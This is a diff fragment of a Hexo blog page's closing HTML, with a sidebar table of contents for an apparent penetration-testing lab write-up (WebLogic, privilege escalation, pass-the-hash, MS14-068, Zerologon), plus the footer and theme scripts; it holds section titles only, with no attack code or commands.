+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PC"><span class="nav-text">PC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC"><span class="nav-text">DC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91"><span class="nav-text">外网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic"><span class="nav-text">weblogic</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F"><span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTH%EF%BC%8CMS14-068%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE-%E7%8E%AF%E5%A2%83%E6%84%9F%E8%A7%89%E8%A2%AB%E6%88%91%E5%BC%84%E5%9D%8F%E4%BA%86%EF%BC%8C%E5%A4%B1%E8%B4%A5"><span class="nav-text">PTH，MS14-068伪造票据(环境感觉被我弄坏了，失败)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zerologon"><span class="nav-text">zerologon</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
